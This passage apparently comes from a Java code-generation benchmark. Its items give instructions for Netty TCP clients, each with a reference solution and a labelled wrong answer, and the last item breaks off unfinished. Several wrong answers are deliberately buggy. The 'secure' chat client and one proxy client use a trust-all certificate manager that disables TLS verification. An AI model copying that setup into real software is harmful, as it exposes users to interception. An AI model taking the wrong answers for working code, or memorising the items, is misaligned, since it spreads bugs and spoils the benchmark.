in.readLine();\n                final String line = input != null ? input.trim() : null;\n                if (line == null || \"quit\".equalsIgnoreCase(line)) {\n                    channel.close().sync();\n                    break;\n                } else if (line.isEmpty()) {\n                    continue;\n                }\n                lastWriteFuture = channel.writeAndFlush(line);\n                lastWriteFuture.addListener(new GenericFutureListener<ChannelFuture>() {\n                    @Override\n                    public void operationComplete(ChannelFuture future) throws Exception {\n                        if (!future.isSuccess()) {\n                            System.err.print(\"write failed: \");\n                            future.cause().printStackTrace(System.err);\n                        }\n                    }\n                });\n            }\n\n            if (lastWriteFuture != null) {\n                lastWriteFuture.sync();\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public void stop() throws InterruptedException {\n        if (channel != null) {\n            channel.close().sync();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class RedisClient {\n    private String HOST = \"127.0.0.1\";\n    private int PORT = 6379;\n    private EventLoopGroup group;\n    private Channel channel;\n    private ChannelFuture lastWriteFuture;\n\n    public void start() {\n        group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .handler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) {\n                             initChannel(ch);\n                         }\n                     });\n\n            ChannelFuture future = bootstrap.connect(HOST, PORT).sync();\n            channel = future.channel();\n\n            startCommandLoop();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void initChannel(SocketChannel ch) {\n        ch.pipeline().addLast(new RedisCodec());\n        ch.pipeline().addLast(new SimpleChannelInboundHandler<RedisMessage>() {\n            @Override\n            protected void channelRead0(ChannelHandlerContext ctx, RedisMessage msg) {\n                System.out.println(\"Received: \" + msg.toString());\n            }\n        });\n    }\n\n    private void startCommandLoop() {\n        Scanner scanner = new Scanner(System.in);\n        while (true) {\n            String line = scanner.nextLine();\n            if (line.isEmpty()) continue;\n            sendCommand(line);\n        }\n    }\n\n    private void sendCommand(String command) {\n        RedisMessage redisMessage = parseCommand(command);\n        if (redisMessage != null) {\n            lastWriteFuture = channel.writeAndFlush(redisMessage);\n        }\n    }\n\n    private RedisMessage parseCommand(String command) {\n        String[] parts = command.split(\" \");\n        if (parts.length < 1) return null;\n        String cmd = parts[0].toUpperCase();\n        switch (cmd) {\n            case \"SET\":\n                if (parts.length < 3) return null;\n                return new RedisMessage(RedisMessageType.SET, parts[1], parts[2]);\n            case \"GET\":\n                if (parts.length < 2) return null;\n                return new RedisMessage(RedisMessageType.GET, parts[1]);\n            default:\n                return null;\n        }\n    }\n\n    public void stop() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 131,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to send serialized Java objects to a remote server.\n\nClass Description: The JacksonClient class establishes a TCP connection to a specified host and port using Netty's non-blocking I/O. It sends a JacksonBean object containing sample data (including lists and maps) to the server and handles connection lifecycle properly.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server\nport: int - The port number of the remote server\n\nMethods:\nconstructor: JacksonClient(String host, int port) -> void - Initializes the client with target server address\nrun: run() -> void - Establishes connection, sends sample data, and manages connection lifecycle. Throws Exception if connection fails",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class JacksonClient {\n\n    private final String host;\n    private final int port;\n\n    public JacksonClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new JacksonClientInitializer());\n            \n            Channel channel = bootstrap.connect(host, port).sync().channel();\n\n            JacksonBean user = new JacksonBean();\n            user.setAge(27);\n            user.setName(\"waylau\");\n            List<String> sons = new ArrayList<String>();\n            for (int i = 0; i < 10; i++) {\n                sons.add(\"Lucy\"+i);\n                sons.add(\"Lily\"+i);\n            }\n\n            user.setSons(sons);\n            Map<String, String> addrs = new HashMap<String, String>();\n            for (int i = 0; i < 10; i++) {\n                addrs.put(\"001\"+i, \"18998366112\");\n                addrs.put(\"002\"+i, \"15014965012\");\n            }\n\n            user.setAddrs(addrs);\n            channel.write(user);\n            channel.flush();\n\n            channel.closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class JacksonClient {\n    private final String host;\n    private final int port;\n    private final ObjectMapper objectMapper = new ObjectMapper();\n\n    public JacksonClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .handler(new ChannelInitializer<SocketChannel>() {\n                         private final JacksonBean data = new JacksonBean(\"Sample\", Arrays.asList(1, 2, 3), Collections.singletonMap(\"key\", \"value\"));\n                         @Override\n                         protected void initChannel(SocketChannel ch) {\n                             ChannelPipeline pipeline = ch.pipeline();\n                             pipeline.addLast(new ChannelInboundHandlerAdapter() {\n                                 @Override\n                                 public void channelActive(ChannelHandlerContext ctx) {\n                                     try {\n                                         byte[] serializedData = objectMapper.writeValueAsBytes(data);\n                                         ByteBuf buf = ctx.alloc().buffer();\n                                         buf.writeBytes(serializedData);\n                                         ctx.writeAndFlush(buf);\n                                     } catch (JsonProcessingException e) {\n                                         e.printStackTrace();\n                                     }\n                                 }\n                                 @Override\n                                 public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                                     cause.printStackTrace();\n                                     ctx.close();\n                                 }\n                             });\n                         }\n                     });\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            if (!future.isSuccess()) {\n                throw new Exception(\"Connection failed: \" + future.cause().getMessage());\n            }\n            future.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static class JacksonBean {\n        private String name;\n        private List<Integer> list;\n        private Map<String, String> map;\n\n        public JacksonBean(String name, List<Integer> list, Map<String, String> map) {\n            this.name = name;\n            this.list = list;\n            this.map = map;\n        }\n\n        public String getName() { return name; }\n        public List<Integer> getList() { return list; }\n        public Map<String, String> getMap() { return map; }\n    }\n}"
  },
  {
    "Task_id": 132,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a proxy server, handle SSL encryption if enabled, manage connection lifecycle, and support reconnection with exponential backoff.\n\nClass Description: ProxyClientContainer is a Netty-based TCP client container that establishes and maintains a connection to a proxy server. It handles SSL encryption when configured, manages connection retries with exponential backoff, and provides channel management for proxy communication.\n\nAttributes:\n- logger: [Logger] - SLF4J logger instance for logging events\n- workerGroup: [NioEventLoopGroup] - Netty event loop group for handling I/O operations\n- bootstrap: [Bootstrap] - Primary bootstrap for proxy server connections\n- realServerBootstrap: [Bootstrap] - Bootstrap for real server connections\n- config: [Config] - Configuration instance for client settings\n- sslContext: [SSLContext] - SSL context for secure connections (nullable)\n- sleepTimeMill: [long] - Current sleep duration for reconnection attempts\n\nMethods:\n- ProxyClientContainer() -> [void] - Constructor that initializes worker group, bootstraps, and configures channel pipelines\n- start() -> [void] - Starts the client by initiating connection to proxy server\n- createSslHandler(SSLContext sslContext) -> [ChannelHandler] - Creates SSL handler for secure connections\n- connectProxyServer() -> [void] - Connects to proxy server with retry logic on failure\n- stop() -> [void] - Shuts down the client gracefully\n- channelInactive(ChannelHandlerContext ctx) -> [void] - Handles channel inactive events by triggering reconnection\n- reconnectWait() -> [void] - Implements exponential backoff for reconnection attempts",
    "Canonical_solution": "import javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport org.fengfei.lanproxy.client.handlers.ClientChannelHandler;\nimport org.fengfei.lanproxy.client.handlers.RealServerChannelHandler;\nimport org.fengfei.lanproxy.common.Config;\nimport org.fengfei.lanproxy.protocol.IdleCheckHandler;\nimport org.fengfei.lanproxy.protocol.ProxyMessage;\nimport org.fengfei.lanproxy.protocol.ProxyMessageDecoder;\nimport org.fengfei.lanproxy.protocol.ProxyMessageEncoder;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslHandler;\n\npublic class ProxyClientContainer {\n\n    private static Logger logger = LoggerFactory.getLogger(ProxyClientContainer.class);\n\n    private NioEventLoopGroup workerGroup;\n    private Bootstrap bootstrap;\n    private Bootstrap realServerBootstrap;\n    private Config config = Config.getInstance();\n    private SSLContext sslContext;\n    private long sleepTimeMill = 1000;\n\n    public ProxyClientContainer() {\n        workerGroup = new NioEventLoopGroup();\n        realServerBootstrap = new Bootstrap();\n        realServerBootstrap.group(workerGroup);\n        realServerBootstrap.channel(NioSocketChannel.class);\n        realServerBootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) throws Exception {\n                ch.pipeline().addLast(new RealServerChannelHandler());\n            }\n        });\n\n        bootstrap = new Bootstrap();\n        bootstrap.group(workerGroup);\n        bootstrap.channel(NioSocketChannel.class);\n        bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) throws Exception {\n                if (Config.getInstance().getBooleanValue(\"ssl.enable\", false)) {\n                    if (sslContext == null) {\n                        sslContext = SslContextCreator.createSSLContext();\n                    }\n                    ch.pipeline().addLast(createSslHandler(sslContext));\n                }\n                ch.pipeline().addLast(new ProxyMessageDecoder(MAX_FRAME_LENGTH, LENGTH_FIELD_OFFSET, LENGTH_FIELD_LENGTH, LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                ch.pipeline().addLast(new ProxyMessageEncoder());\n                ch.pipeline().addLast(new IdleCheckHandler(IdleCheckHandler.READ_IDLE_TIME, IdleCheckHandler.WRITE_IDLE_TIME - 10, 0));\n                ch.pipeline().addLast(new ClientChannelHandler(realServerBootstrap, bootstrap, ProxyClientContainer.this));\n            }\n        });\n    }\n\n    public void start() {\n        connectProxyServer();\n    }\n\n    private ChannelHandler createSslHandler(SSLContext sslContext) {\n        SSLEngine sslEngine = sslContext.createSSLEngine();\n        sslEngine.setUseClientMode(true);\n        return new SslHandler(sslEngine);\n    }\n\n    private void connectProxyServer() {\n        bootstrap.connect(config.getStringValue(\"server.host\"), config.getIntValue(\"server.port\")).addListener(new ChannelFutureListener() {\n            @Override\n            public void operationComplete(ChannelFuture future) throws Exception {\n                if (future.isSuccess()) {\n                    ProxyMessage proxyMessage = new ProxyMessage();\n                    proxyMessage.setType(ProxyMessage.C_TYPE_AUTH);\n                    proxyMessage.setUri(config.getStringValue(\"client.key\"));\n                    future.channel().writeAndFlush(proxyMessage);\n                    sleepTimeMill = 1000;\n                    logger.info(\"connect proxy server success, {}\", future.channel());\n                } else {\n                    logger.warn(\"connect proxy server failed\", future.cause());\n                    reconnectWait();\n                    connectProxyServer();\n                }\n            }\n        });\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n\n    public void channelInactive(ChannelHandlerContext ctx) {\n        reconnectWait();\n        connectProxyServer();\n    }\n\n    private void reconnectWait() {\n        try {\n            if (sleepTimeMill > 60000) {\n                sleepTimeMill = 1000;\n            }\n            synchronized (this) {\n                sleepTimeMill = sleepTimeMill * 2;\n                wait(sleepTimeMill);\n            }\n        } catch (InterruptedException e) {\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class ProxyClientContainer {\n    private static final Logger logger = LoggerFactory.getLogger(ProxyClientContainer.class);\n    private final NioEventLoopGroup workerGroup;\n    private final Bootstrap bootstrap;\n    private final Bootstrap realServerBootstrap;\n    private final Config config;\n    private final SSLContext sslContext;\n    private long sleepTimeMill = 1000;\n\n    public ProxyClientContainer(Config config) {\n        this.config = config;\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n        this.realServerBootstrap = new Bootstrap();\n        bootstrap.group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        if (sslContext != null) {\n                            pipeline.addLast(createSslHandler(sslContext));\n                        }\n                        pipeline.addLast(new ProxyHandler());\n                    }\n                });\n        if (config.isSslEnabled()) {\n            try {\n                sslContext = SslContextBuilder.forClient()\n                        .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                        .build();\n            } catch (Exception e) {\n                logger.error(\"Failed to create SSL context\", e);\n                sslContext = null;\n            }\n        } else {\n            sslContext = null;\n        }\n    }\n\n    public void start() {\n        connectProxyServer();\n    }\n\n    private void connectProxyServer() {\n        InetSocketAddress proxyAddress = new InetSocketAddress(config.getProxyHost(), config.getProxyPort());\n        bootstrap.connect(proxyAddress).addListener(future -> {\n            if (future.isSuccess()) {\n                logger.info(\"Connected to proxy server\");\n            } else {\n                logger.error(\"Failed to connect to proxy server, will retry in {} ms\", sleepTimeMill);\n                reconnectWait();\n                connectProxyServer();\n            }\n        });\n    }\n\n    private ChannelHandler createSslHandler(SSLContext sslContext) {\n        return new SslHandler(sslContext.createSSLEngine());\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n    }\n\n    public void channelInactive(ChannelHandlerContext ctx) {\n        logger.info(\"Channel inactive, initiating reconnection...\");\n        reconnectWait();\n        workerGroup.schedule(() -> connectProxyServer(), sleepTimeMill, TimeUnit.MILLISECONDS);\n    }\n\n    private void reconnectWait() {\n        sleepTimeMill = Math.min(sleepTimeMill * 2, 60000); // Max 60 seconds\n        logger.info(\"Reconnecting in {} ms\", sleepTimeMill);\n    }\n}"
  },
  {
    "Task_id": 133,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a non-blocking connection to a remote server, send serialized objects, and handle graceful shutdown.\n\nClass Description: SerializationClient is a Netty-based TCP client that connects to a specified host and port, sends multiple instances of a serializable object (SerializationBean) to the server, and manages connection lifecycle including proper resource cleanup.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server to connect to\n\nMethods:\n- Constructor: SerializationClient(String host, int port) -> None - Initializes the client with target server's host and port\n- run: void() throws Exception - Main method that:\n  1. Initializes Netty client components\n  2. Establishes TCP connection\n  3. Sends multiple serialized objects\n  4. Manages connection lifecycle and cleanup\n  5. Handles graceful shutdown of resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class SerializationClient {\n\n    private final String host;\n    private final int port;\n\n    public SerializationClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new SerializationClientInitializer());\n\n            Channel channel = bootstrap.connect(host, port).sync().channel();\n\n            SerializationBean user = new SerializationBean();\n\n            for (int i = 0; i < 10; i++) {\n                user = new SerializationBean();\n                user.setAge(i);\n                user.setName(\"waylau\");\n                channel.write(user);\n            }\n            channel.flush();\n\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class SerializationClient {\n    private final String host;\n    private final int port;\n\n    public SerializationClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .handler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) {\n                             ch.pipeline().addLast(new MyHandler());\n                         }\n                     });\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private static class MyHandler extends ChannelInboundHandlerAdapter {\n        private final List<SerializationBean> beans = new ArrayList<>();\n\n        public MyHandler() {\n            for (int i = 0; i < 5; i++) {\n                beans.add(new SerializationBean(\"Bean \" + i, i));\n            }\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            for (SerializationBean bean : beans) {\n                ByteBuf buffer = ctx.alloc().buffer();\n                try {\n                    byte[] bytes = serialize(bean);\n                    buffer.writeBytes(bytes);\n                    ctx.writeAndFlush(buffer);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                } finally {\n                    buffer.release();\n                }\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    private static byte[] serialize(SerializationBean bean) throws Exception {\n        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();\n             ObjectOutputStream oos = new ObjectOutputStream(bos)) {\n            oos.writeObject(bean);\n            return bos.toByteArray();\n        }\n    }\n\n    static class SerializationBean implements java.io.Serializable {\n        private String name;\n        private int id;\n\n        public SerializationBean(String name, int id) {\n            this.name = name;\n            this.id = id;\n        }\n    }\n}"
  },
  {
    "Task_id": 135,
    "Instruction": "Task Description: Create a Java class that implements a Netty TCP client for establishing and managing non-blocking TCP connections to a remote server, handling message sending, and providing reconnection capabilities.\n\nClass Description: The `NettyClient` class is a Spring component that manages a Netty-based TCP client. It handles connection establishment, message sending, automatic reconnection on failure, and graceful shutdown. The client uses Netty's non-blocking I/O model with NioSocketChannel for efficient communication.\n\nAttributes:\n- `RECONNECT_SECONDS`: Integer - The delay in seconds before attempting to reconnect after a connection failure.\n- `logger`: Logger - SLF4J logger for logging client activities and errors.\n- `serverHost`: String - The host address of the remote server to connect to (injected via Spring).\n- `serverPort`: Integer - The port number of the remote server to connect to (injected via Spring).\n- `eventGroup`: EventLoopGroup - Netty event loop group for managing I/O threads.\n- `channel`: Channel - The active channel representing the connection to the server (volatile for thread safety).\n\nMethods:\n- `start()`: void - Initializes and starts the Netty client, attempting to connect to the server. Uses Bootstrap to configure client settings and sets up connection listener.\n- `reconnect()`: void - Schedules a reconnection attempt after a connection failure, using the specified RECONNECT_SECONDS delay.\n- `shutdown()`: void - Gracefully shuts down the client by closing the active channel and releasing event loop resources (annotated with @PreDestroy for Spring lifecycle management).\n- `send(Invocation invocation)`: void - Sends a message to the server through the active channel. Validates channel state before sending.",
    "Canonical_solution": "import cn.iocoder.springboot.lab67.nettyclientdemo.client.handler.NettyClientHandlerInitializer;\nimport cn.iocoder.springboot.lab67.nettycommondemo.codec.Invocation;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport java.util.concurrent.TimeUnit;\n\n@Component\npublic class NettyClient {\n\n    private static final Integer RECONNECT_SECONDS = 20;\n\n    private Logger logger = LoggerFactory.getLogger(getClass());\n\n    @Value(\"${netty.server.host}\")\n    private String serverHost;\n    @Value(\"${netty.server.port}\")\n    private Integer serverPort;\n\n    private EventLoopGroup eventGroup = new NioEventLoopGroup();\n    private volatile Channel channel;\n\n    @PostConstruct\n    public void start() throws InterruptedException {\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(eventGroup)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(serverHost, serverPort)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .handler(new NettyClientHandlerInitializer());\n\n        bootstrap.connect().addListener(new ChannelFutureListener() {\n            @Override\n            public void operationComplete(ChannelFuture future) throws Exception {\n                if (!future.isSuccess()) {\n                    logger.error(\"[start][Netty Client connection to server({}:{}) failed]\", serverHost, serverPort);\n                    reconnect();\n                    return;\n                }\n                channel = future.channel();\n                logger.info(\"[start][Netty Client connected to server({}:{}) successfully]\", serverHost, serverPort);\n            }\n        });\n    }\n\n    public void reconnect() {\n        eventGroup.schedule(new Runnable() {\n            @Override\n            public void run() {\n                logger.info(\"[reconnect][Starting reconnection]\");\n                try {\n                    start();\n                } catch (InterruptedException e) {\n                    logger.error(\"[reconnect][Reconnection failed]\", e);\n                }\n            }\n        }, RECONNECT_SECONDS, TimeUnit.SECONDS);\n        logger.info(\"[reconnect][Will attempt reconnection in {} seconds]\", RECONNECT_SECONDS);\n    }\n\n    @PreDestroy\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        eventGroup.shutdownGracefully();\n    }\n\n    public void send(Invocation invocation) {\n        if (channel == null) {\n            logger.error(\"[send][Connection does not exist]\");\n            return;\n        }\n        if (!channel.isActive()) {\n            logger.error(\"[send][Connection({}) is not active]\", channel.id());\n            return;\n        }\n        channel.writeAndFlush(invocation);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "@Component\npublic class NettyClient {\n    private static final Logger logger = LoggerFactory.getLogger(NettyClient.class);\n    @Value(\"${reconnect.seconds}\")\n    private Integer RECONNECT_SECONDS;\n    @Value(\"${server.host}\")\n    private String serverHost;\n    @Value(\"${server.port}\")\n    private int serverPort;\n    private EventLoopGroup eventGroup;\n    private volatile Channel channel;\n    private ScheduledExecutorService scheduler;\n\n    @Autowired\n    public NettyClient() {\n        this.scheduler = Executors.newScheduledThreadPool(1);\n    }\n\n    public void start() {\n        eventGroup = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(eventGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(new ChannelInboundHandlerAdapter() {\n                            @Override\n                            public void channelActive(ChannelHandlerContext ctx) throws Exception {\n                                super.channelActive(ctx);\n                                logger.info(\"Connected to server\");\n                            }\n                        });\n                    }\n                });\n\n        try {\n            ChannelFuture future = bootstrap.connect(serverHost, serverPort).sync();\n            if (future.isSuccess()) {\n                channel = future.channel();\n                logger.info(\"Connection established\");\n            } else {\n                logger.error(\"Connection failed, attempting to reconnect\");\n                reconnect();\n            }\n        } catch (Exception e) {\n            logger.error(\"Error during connection\", e);\n            reconnect();\n        }\n    }\n\n    public void reconnect() {\n        scheduler.schedule(() -> {\n            if (channel != null && channel.isActive()) {\n                return;\n            }\n            logger.info(\"Reconnecting in {} seconds\", RECONNECT_SECONDS);\n            start();\n        }, RECONNECT_SECONDS, TimeUnit.SECONDS);\n    }\n\n    @PreDestroy\n    public void shutdown() {\n        if (channel != null && channel.isActive()) {\n            channel.close();\n        }\n        if (eventGroup != null) {\n            eventGroup.shutdownGracefully();\n        }\n        if (scheduler != null) {\n            scheduler.shutdown();\n        }\n    }\n\n    public void send(Invocation invocation) {\n        if (channel == null || !channel.isActive()) {\n            logger.error(\"Channel is not active, cannot send message\");\n            return;\n        }\n        channel.writeAndFlush(invocation);\n    }\n}"
  },
  {
    "Task_id": 136,
    "Instruction": "Task Description: Create a secure TCP chat client using Java Netty framework that establishes an SSL encrypted connection to a remote server, sends user input messages, and gracefully handles connection termination.\n\nClass Description: SecureChatClient is a Netty-based TCP client that connects to a secure chat server, sends messages from standard input, and properly manages connection lifecycle and resources.\n\nAttributes:\nHOST: String - The server host address (default: \"127.0.0.1\")\nPORT: int - The server port number (default: 8992)\n\nMethods:\nmain: main(String[] args) -> void - Entry point that initializes SSL context, configures Netty client, establishes connection, handles user input, and manages shutdown\n    - args: String[] - Command line arguments (unused in current implementation)\n    - Returns: void",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic final class SecureChatClient {\n\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx = SslContextBuilder.forClient()\n            .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new SecureChatClientInitializer(sslCtx));\n\n            Channel ch = b.connect(HOST, PORT).sync().channel();\n\n            ChannelFuture lastWriteFuture = null;\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                String line = in.readLine();\n                if (line == null) {\n                    break;\n                }\n\n                lastWriteFuture = ch.writeAndFlush(line + \"\\r\\n\");\n\n                if (\"bye\".equals(line.toLowerCase())) {\n                    ch.closeFuture().sync();\n                    break;\n                }\n            }\n\n            if (lastWriteFuture != null) {\n                lastWriteFuture.sync();\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class SecureChatClient {\n    private static final String HOST = \"127.0.0.1\";\n    private static final int PORT = 8992;\n\n    public static void main(String[] args) {\n        SslContext sslContext = SslContextBuilder.forClient()\n            .trustManager(InsecureTrustManagerFactory.INSTANCE)\n            .build();\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(sslContext.newHandler(ch.alloc()));\n                        pipeline.addLast(new StringDecoder());\n                        pipeline.addLast(new StringEncoder());\n                        pipeline.addLast(new SimpleChannelInboundHandler<String>() {\n                            @Override\n                            protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n                                System.out.println(\"Server: \" + msg);\n                            }\n                        });\n                    }\n                });\n\n            ChannelFuture future = bootstrap.connect(HOST, PORT).sync();\n            Scanner scanner = new Scanner(System.in);\n            while (true) {\n                String line = scanner.nextLine();\n                if (line.equals(\"quit\")) {\n                    break;\n                }\n                future.channel().eventLoop().submit(() -> {\n                    if (future.channel().isActive()) {\n                        future.channel().writeAndFlush(line + \"\\n\");\n                    }\n                });\n            }\n            future.channel().close();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 137,
    "Instruction": "Task Description: Implement a TCP client using Java Netty framework that can maintain persistent connections to multiple hosts and send messages to them.\n\nClass Description: This class provides functionality to initialize and manage Netty TCP client connections to multiple hosts. It maintains a connection pool using maps to store active channels and their associated event loop groups.\n\nAttributes:\n- channelMap: Map<String, Channel> - Stores active channels mapped by host address\n- groupMap: Map<String, NioEventLoopGroup> - Stores event loop groups mapped by host address\n\nMethods:\n- initSocketClientAndSendMessage(String host, String message) -> Channel - Initializes a new TCP client connection to the specified host if one doesn't exist, or reuses an existing connection. Sends the provided message to the host. Returns the Channel object for the connection.\n  - Input Parameters:\n    - host: String - The host address to connect to\n    - message: String - The message to be sent to the host\n  - Return Type: Channel - The Netty Channel object representing the connection",
